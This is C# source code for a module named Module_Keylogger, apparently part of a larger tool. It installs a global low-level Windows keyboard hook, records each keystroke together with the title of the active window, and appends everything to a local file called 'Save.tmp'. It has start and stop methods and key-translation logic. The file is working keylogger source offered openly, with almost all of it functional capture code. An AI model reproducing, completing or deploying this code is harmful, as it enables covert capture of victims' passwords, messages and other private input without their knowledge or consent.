using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using Module_Keylogger.Response;
using System.Reflection;

namespace Module_Keylogger
{
    public class Module_Keylogger
    {
        IntPtr HHOOK;
        string Oldtitle;
        public OnStartKeyboardCaptureResponse OnStartKeyboardCapture()
        {
            OnStartKeyboardCaptureResponse ROnStartKeyboardCaptureResponse = new OnStartKeyboardCaptureResponse();
            try
            {
                var appInstance = IntPtr.Zero;
                HHOOK = SetWindowsHookEx(WH_KEYBOARD_LL, ProcessKeyboard, appInstance, 0);
                ROnStartKeyboardCaptureResponse.Description = "OnStartKeyboardCapture Worked";
            }
            catch (Exception ex)
            {
                ROnStartKeyboardCaptureResponse.Errors.AddErrorToErrorList(MethodBase.GetCurrentMethod().ToString(), ex.Message);
            }
            return ROnStartKeyboardCaptureResponse;
        }
        public OnStopKeyboardCaptureResponse OnStopKeyboardCapture()
        {
            OnStopKeyboardCaptureResponse ROnStopKeyboardCaptureResponse = new OnStopKeyboardCaptureResponse();
            try
            {
                var appInstance = IntPtr.Zero;
                UnhookWindowsHookEx(HHOOK);
                ROnStopKeyboardCaptureResponse.Description = "OnStopKeyboardCapture Worked";
            }
            catch (Exception ex)
            {
                ROnStopKeyboardCaptureResponse.Errors.AddErrorToErrorList(MethodBase.GetCurrentMethod().ToString(), ex.Message);
            }
            return ROnStopKeyboardCaptureResponse;
        }
        public int ProcessKeyboard(int code, int wParam, ref keyboardHookStruct lParam)
        {
            StringBuilder btitle = new StringBuilder(1024);
            GetWindowText(GetForegroundWindow(), btitle, GetWindowTextLength(GetForegroundWindow()) + 1);
            string title = btitle.ToString();
            if (title != Oldtitle)
            {
                Oldtitle = title;
                save("\r\n+++++++++++++\r\nWindow= ");
                save(title);
                save("\r\n+++++++++++++\r\n");
            }

            int vkCode = lParam.vkCode;
            switch (wParam)
            {
                case WM_KEYDOWN:
                    {
                        if ((vkCode >= 48) && (vkCode <= 57))
                        {
                            if (GetAsyncKeyState(VK_SHIFT))
                            {
                                ProcessKeyDown48_57_ShiftDown(vkCode);
                            }
                            else
                            {
                                save(((char)vkCode).ToString());
                            }
                        }
                        else if ((vkCode > 64) && (vkCode < 91))
                        {
                            if (!(logicalXOR(GetAsyncKeyState(VK_SHIFT), isCapsLock()))) // Check if letters should be lowercase
                            {

                            }

                            WritesScannedKeyToFile(vkCode);
                        }
                        else
                        {
                            ProcessKeyDown_Over91(vkCode);
                        }
                    }
                    break;
                case WM_SYSKEYDOWN:
                    {
                        if (GetAsyncKeyState(VK_MENU))
                        {

                            if (vkCode == 164)
                            {
                                save("[ALT]");
                            }
                            else if (vkCode == 96)
                            {
                                save("[num 0]");
                            }
                            else if (vkCode == 97)
                            {
                                save("[num 1]");
                            }
                            else if (vkCode == 98)
                            {
                                save("[num 2]");
                            }
                            else if (vkCode == 99)
                            {
                                save("[num 3]");
                            }
                            else if (vkCode == 100)
                            {
                                save("[num 4]");
                            }
                            else if (vkCode == 101)
                            {
                                save("[num 5]");
                            }
                            else if (vkCode == 102)
                            {
                                save("[num 6]");
                            }
                            else if (vkCode == 103)
                            {
                                save("[num 7]");
                            }
                            else if (vkCode == 104)
                            {
                                save("[num 8]");
                            }
                            else if (vkCode == 105)
                            {
                                save("[num 9]");
                            }
                            else if (vkCode == 46)
                            {
                                save("[num .]");
                            }
                            else if (vkCode == 13)
                            {
                                save("[num enter]");
                            }
                            else if (vkCode == 107)
                            {
                                save("[num +]");
                            }
                            else if (vkCode == 109)
                            {
                                save("[num -]");
                            }
                            else if (vkCode == 106)
                            {
                                save("[num *]");
                            }
                            else if (vkCode == 111)
                            {
                                save("[num Look]");
                            }
                            else {
                                WritesScannedKeyToFile(vkCode, 0);
                            }

                        }
                    }
                    break;
            }
            return CallNextHookEx(HHOOK, code, wParam, ref lParam);
        }



        void ProcessKeyDown48_57_ShiftDown(int vkCode)
        {
            switch (vkCode)
            {
                case 0x30:
                    {
                        if (GetAsyncKeyState(VK_SHIFT))
                            WritesScannedKeyToFile(vkCode, 1);
                        else
                            WritesScannedKeyToFile(vkCode);
                    }
                    break;
                case 0x31:
                case 0x32:
                case 0x33:
                case 0x34:
                case 0x35:
                case 0x36:
                case 0x37:
                case 0x38:
                    WritesScannedKeyToFile(vkCode, 1);
                    break;
                case 0x39:
                    {
                        if (GetAsyncKeyState(VK_SHIFT))
                            WritesScannedKeyToFile(vkCode, 1);
                        else
                            WritesScannedKeyToFile(vkCode);
                    }
                    break;
            }
        }
        private void ProcessKeyDown_Over91(int vkCode)
        {
            switch (vkCode)
            {
                case VK_LEFT:
                    {
                        save("[LEFT]");
                    }
                    break;
                case VK_UP:
                    {
                        save("[UP]");
                    }

                    break;
                case VK_RIGHT:
                    {
                        save("[RIGHT]");
                    }
                    break;
                case VK_DOWN:
                    {
                        save("[DOWN]");
                    }
                    break;
                case VK_RETURN:
                    {
                        save("[ENTER]");
                    }
                    break;
                case VK_BACK:
                    {
                        save("[BKSP]");
                    }
                    break;
                case VK_TAB:
                    {
                        save("[TAB]");
                    }
                    break;
                case VK_LCONTROL:
                case VK_RCONTROL:
                    save("[CTRL]");
                    break;
                case VK_LMENU:
                case VK_RMENU:
                    save("[ALT]");
                    break;
                case VK_CAPITAL:
                    save("[CAPS]");
                    break;
                case VK_ESCAPE:
                    save("[ESC]");
                    break;
                case VK_INSERT:
                    save("[INSERT]");
                    break;
                case VK_DELETE:
                    save("[DEL]");
                    break;
                case VK_SPACE:
                case VK_NUMPAD0:
                case VK_NUMPAD1:
                case VK_NUMPAD2:
                case VK_NUMPAD3:
                case VK_NUMPAD4:
                case VK_NUMPAD5:
                case VK_NUMPAD6:
                case VK_NUMPAD7:
                case VK_NUMPAD8:
                case VK_NUMPAD9:
                case VK_OEM_2:
                case VK_OEM_3:
                case VK_OEM_4:
                case VK_OEM_5:
                case VK_OEM_6:
                case VK_OEM_7:
                case 0xBC:
                case 0xBE:
                case 0xBA:
                case 0xBD:
                case 0xBB:
                    if (GetAsyncKeyState(VK_SHIFT))
                        WritesScannedKeyToFile(vkCode, 1);
                    else
                        WritesScannedKeyToFile(vkCode);
                    break;
            }
        }




        void WritesScannedKeyToFile(int sScannedKey, int shift = 0)
        {
            IntPtr hkl;
            uint dwThreadId;
            uint dwProcessId;

            IntPtr hWindowHandle = GetForegroundWindow();
            dwThreadId = GetWindowThreadProcessId(hWindowHandle, out dwProcessId);
            byte[] kState = new byte[255];
            GetKeyboardState(kState);
            if (shift == 1)
            {
                kState[16] = 0x80;
            }
            int ii = kState[17];
            if (kState[17] > 0)//control clear
            {
                kState[17] = 0;
            }
            hkl = GetKeyboardLayout(dwThreadId);
            StringBuilder UniChar = new StringBuilder(1024);
            uint virtualKey = (uint)sScannedKey;
            ToUnicodeEx(virtualKey, (uint)sScannedKey, kState, UniChar, 16, 0, hkl);
            save(UniChar.ToString());
        }
        bool isCapsLock()
        {
            if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
                return true;
            else
                return false;
        }

        bool logicalXOR(bool p, bool q)
        {

            return ((p || q) && !(p && q));
        }
        private void save(string data)
        {
            StreamWriter stw = File.AppendText("Save.tmp");
            stw.Write(data);
            stw.Flush();
            stw.Close();
        }



        [DllImport("user32.dll")]
        static extern bool GetAsyncKeyState(int vKey);
        const int WM_KEYDOWN = 0x0100;
        const int VK_SHIFT = 0x10;
        const int WM_SYSKEYDOWN = 0x0104;
        const int VK_MENU = 0x12;
        public struct keyboardHookStruct
        {
            public int vkCode;
            public int scanCode;
            public int flags;
            public int time;
            public int dwExtraInfo;
        }
        public delegate int keyboardHookProc(int code, int wParam, ref keyboardHookStruct lParam);
        const int WH_KEYBOARD_LL = 13;
        /// <summary>
        /// Sets the windows hook, do the desired event, one of hInstance or threadId must be non-null
        /// </summary>
        /// <param name="idHook">The id of the event you want to hook</param>
        /// <param name="callback">The callback.</param>
        /// <param name="hInstance">The handle you want to attach the event to, can be null</param>
        /// <param name="threadId">The thread you want to attach the event to, can be null</param>
        /// <returns>a handle to the desired hook</returns>
        [DllImport("user32", EntryPoint = "SetWindowsHookExA")]
        static extern IntPtr SetWindowsHookEx(int idHook, keyboardHookProc callback, IntPtr hInstance, uint threadId);

        /// <summary>
        /// Unhooks the windows hook.
        /// </summary>
        /// <param name="hInstance">The hook handle that was returned from SetWindowsHookEx</param>
        /// <returns>True if successful, false otherwise</returns>
        [DllImport("user32.dll")]
        static extern bool UnhookWindowsHookEx(IntPtr hInstance);

        /// <summary>
        /// Calls the next hook.
        /// </summary>
        /// <param name="idHook">The hook id</param>
        /// <param name="nCode">The hook code</param>
        /// <param name="wParam">The wparam.</param>
        /// <param name="lParam">The lparam.</param>
        /// <returns></returns>
        [DllImport("user32.dll")]
        static extern int CallNextHookEx(IntPtr idHook, int nCode, int wParam, ref keyboardHookStruct lParam);

        /// <summary>
        /// Loads the library.
        /// </summary>
        /// <param name="lpFileName">Name of the library</param>
        /// <returns>A handle to the library</returns>
        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("user32.dll", EntryPoint = "GetWindowTextLengthW", CharSet = CharSet.Unicode)]
        private static extern int GetWindowTextLength(IntPtr hWnd);

        [DllImport("user32.dll", EntryPoint = "GetWindowTextW", CharSet = CharSet.Unicode)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int maxLength);
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")]
        static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[]
lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff,
int cchBuff, uint wFlags, IntPtr dwhkl);
        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
        [DllImport("user32.dll")]
        static extern IntPtr GetKeyboardLayout(uint thread);
        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool GetKeyboardState(byte[] lpKeyState);
        [DllImport("USER32.dll")]
        static extern short GetKeyState(int nVirtKey);


        const int VK_CAPITAL = 0x14;
        const int VK_LEFT = 0x25;
        const int VK_UP = 0x26;
        const int VK_RIGHT = 0x27;
        const int VK_DOWN = 0x28;
        const int VK_RETURN = 0x0D;
        const int VK_BACK = 0x08;
        const int VK_TAB = 0x09;
        const int VK_LCONTROL = 0xA2;
        const int VK_RCONTROL = 0xA3;
        const int VK_LMENU = 0xA4;
        const int VK_RMENU = 0xA5;
        const int VK_ESCAPE = 0x1B;
        const int VK_INSERT = 0x2D;
        const int VK_DELETE = 0x2E;
        const int VK_SPACE = 0x20;
        const int VK_NUMPAD0 = 0x60;
        const int VK_NUMPAD1 = 0x61;
        const int VK_NUMPAD2 = 0x62;
        const int VK_NUMPAD3 = 0x63;
        const int VK_NUMPAD4 = 0x64;
        const int VK_NUMPAD5 = 0x65;
        const int VK_NUMPAD6 = 0x66;
        const int VK_NUMPAD7 = 0x67;
        const int VK_NUMPAD8 = 0x68;
        const int VK_NUMPAD9 = 0x69;
        const int VK_OEM_2 = 0xBF;
        const int VK_OEM_3 = 0xC0;
        const int VK_OEM_4 = 0xDB;
        const int VK_OEM_5 = 0xDC;
        const int VK_OEM_6 = 0xDD;
        const int VK_OEM_7 = 0xDE;
    }
}
